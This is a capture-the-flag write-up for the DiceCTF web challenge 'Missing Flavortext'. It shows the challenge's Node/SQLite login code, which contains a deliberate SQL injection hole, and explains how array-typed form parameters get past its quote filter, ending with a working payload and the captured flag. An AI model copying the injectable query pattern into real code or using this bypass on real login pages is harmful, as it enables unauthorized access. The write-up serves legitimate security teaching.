# Missing Flavortext [224 solves/111 points]

```
Hmm, it looks like there's no flavortext here. Can you try and find it?

missing-flavortext.dicec.tf
```

We are again given the `index.js` source code of the site:

```javascript
const crypto = require('crypto');
const db = require('better-sqlite3')('db.sqlite3')

// remake the `users` table
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
);`);

// add an admin user with a random password
db.exec(`INSERT INTO users (username, password) VALUES (
  'admin',
  '${crypto.randomBytes(16).toString('hex')}'
)`);

const express = require('express');
const bodyParser = require('body-parser');

const app = express();

// parse json and serve static files
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('static'));

// login route
app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password) {
    return res.redirect('/');
  }

  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }

  // see if user is in database
  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;

  let id;
  try { id = db.prepare(query).get()?.id } catch {
    return res.redirect('/');
  }

  // correct login
  if (id) return res.sendFile('flag.html', { root: __dirname });

  // incorrect login
  return res.redirect('/');
});

app.listen(3000);
```

 Looking at the source code, our objective is to obtain `flag.html` via a correct login. The backend uses an `sqlite` database, so let's try a quick **SQL Injection**!

Unfortunately, nothing happened :sweat:.

In order to investigate and test the code further, I decided to run this code on a local machine, and we immediately see the issue with passing a plain SQLi payload in: 

```javascript
 if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }
```

will cause it to **fail if there are any `'` in the payload**, which means that we are unable to escape the quotes for an SQLi.

Looking around the code, there isn't anything interesting other than `app.use(bodyParser.urlencoded({ extended: true }));`. A quick google search reveals that this exact setting was abused in a `Google CTF 2020 Web Challenge (Pasteurize)` (_that DiceGang also conveniently solved_)

Apparently what this setting allows is for **other types (arrays, objects) to be passed in, instead of merely just a string**.

Looking at some of the [writeups](https://pop-eax.github.io/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/), we can see a payload like:

```
username[]=hello&password[]=waddle
```

Will get treated as an **object**, rather than a string. So what does this entails?

```
  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }
```

Testing the code out, it seems like the check above will **always return false, and not check for any `'`'**. Hence, we can simply set our SQLi payloads, and it will work magic with the database!

```bash
username[]=' OR 1=1 OR '&password[]=' OR 1=1 OR ' #Unencoded payload
```

And we are in!

```html
<!doctype html>
<html>

<head>
	<link rel="stylesheet" href="/styles.css">
</head>

<body>
	<div>
		<p>Looks like there was no flavortext here either :(</p>
		<p>Here's your flag?</p>
		<p>dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p>
	</div>
</body>

</html>
```

